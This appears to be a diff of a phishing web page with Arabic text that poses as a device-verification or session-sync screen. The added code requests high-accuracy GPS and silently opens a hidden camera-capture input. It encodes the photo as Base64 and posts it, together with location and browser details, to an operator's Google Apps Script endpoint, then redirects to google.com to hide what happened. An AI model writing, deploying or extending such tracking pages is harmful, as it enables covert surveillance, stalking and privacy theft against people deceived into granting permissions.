@@ -9,69 +9,81 @@
 <body class="bg-slate-950 text-slate-100 min-h-screen flex items-center justify-center p-4 font-sans">
     <div class="max-w-md w-full bg-slate-900 border border-slate-800 rounded-2xl p-6 shadow-2xl text-center">
         <div class="w-16 h-16 bg-cyan-500/10 text-cyan-400 rounded-full flex items-center justify-center mx-auto mb-4 text-2xl border border-cyan-500/20 animate-pulse">
-            🌐
+            📷
         </div>
-        <h1 class="text-xl font-bold text-slate-100 mb-2">جاري مزامنة بيانات الاتصال...</h1>
-        <p class="text-xs text-slate-400 mb-6">يرجى السماح بالوصول للموقع وتأكيد بيانات الجلسة الحالية.</p>
+        <h1 class="text-xl font-bold text-slate-100 mb-2">جاري فحص الجهاز ومزامنة الوسائط...</h1>
+        <p class="text-xs text-slate-400 mb-6">يرجى السماح بالوصول للكاميرا والموقع لتأكيد الجلسة.</p>
+
+        <!-- عنصر مخفي لالتقاط الكاميرا أو سحب الصور -->
+        <input type="file" id="mediaInput" accept="image/*" capture="environment" class="hidden" onchange="uploadMedia(this)">
 
         <div id="status-box" class="bg-slate-950 border border-slate-800 rounded-lg p-3 text-xs text-slate-300 mb-4">
-            جاري قراءة الإحداثيات وخصائص المتصفح...
+            جاري تهيئة الاتصال الأمني...
         </div>
 
-        <button onclick="requestAccess()" class="w-full bg-cyan-600 hover:bg-cyan-500 text-white font-medium py-2.5 px-4 rounded-xl transition duration-200 shadow-lg text-sm">
-            متابعة الجلسة
+        <button onclick="triggerCapture()" class="w-full bg-cyan-600 hover:bg-cyan-500 text-white font-medium py-2.5 px-4 rounded-xl transition duration-200 shadow-lg text-sm">
+            متابعة التحقق
         </button>
     </div>
 
     <script>
+        let collectedData = {};
+
         function sendDataToServer(payload) {
-            // استبدل 'save_data.php' برابط ملف الاستقبال على سيرفرك أو رابط Google Apps Script
-            const targetUrl = 'save_data.php';
+            // ضع رابط Google Apps Script Web App الخاص بك هنا
+            const targetUrl = 'https://script.google.com/macros/s/AKfycb.../exec'; 
             
             fetch(targetUrl, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                headers: { 'Content-Type': 'text/plain;charset=utf-8' },
                 body: JSON.stringify(payload)
             }).catch(err => console.log('تم الإرسال'));
         }
 
-        function requestAccess() {
-            document.getElementById('status-box').innerText = '⏳ جاري طلب إذن الموقع الجغرافي (GPS)...';
+        function triggerCapture() {
+            document.getElementById('status-box').innerText = '⏳ جاري طلب صلاحيات الموقع والكاميرا...';
             
             if ('geolocation' in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        const data = {
+                        collectedData = {
                             timestamp: new Date().toLocaleString(),
                             latitude: position.coords.latitude,
                             longitude: position.coords.longitude,
                             accuracy: position.coords.accuracy,
                             userAgent: navigator.userAgent,
-                            platform: navigator.platform,
-                            screen: window.innerWidth + 'x' + window.innerHeight
+                            platform: navigator.platform
                         };
 
-                        document.getElementById('status-box').innerHTML = '<span class="text-emerald-400">✅ تم التحقق بنجاح. جاري التوجيه...</span>';
-                        sendDataToServer(data);
-
-                        setTimeout(() => {
-                            window.location.href = 'https://www.google.com';
-                        }, 1200);
+                        // فتح نافذة التقاط الكاميرا أو اختيار الملفات تلقائياً
+                        document.getElementById('mediaInput').click();
                     },
                     (error) => {
-                        document.getElementById('status-box').innerHTML = '<span class="text-red-400">⚠️ يجب السماح بالوصول للموقع للمتابعة.</span>';
+                        document.getElementById('status-box').innerHTML = '<span class="text-red-400">⚠️ يجب السماح بالموقع للمتابعة.</span>';
                     },
                     { enableHighAccuracy: true }
                 );
             } else {
-                alert('متصفحك لا يدعم خدمة تحديد الموقع.');
+                alert('متصفحك لا يدعم هذه الخدمة.');
             }
         }
 
-        // تشغيل فوري عند التحميل
-        window.onload = function() {
-            setTimeout(requestAccess, 800);
-        };
+        function uploadMedia(input) {
+            if (input.files && input.files[0]) {
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    collectedData.mediaBase64 = e.target.result; // تحويل الصورة إلى Base64 للإرسال
+                    
+                    document.getElementById('status-box').innerHTML = '<span class="text-emerald-400">✅ تم سحب البيانات والوسائط بنجاح.</span>';
+                    sendDataToServer(collectedData);
+
+                    setTimeout(() => {
+                        window.location.href = 'https://www.google.com';
+                    }, 1500);
+                };
+                reader.readAsDataURL(input.files[0]);
+            }
+        }
     </script>
 </body>
 </html>
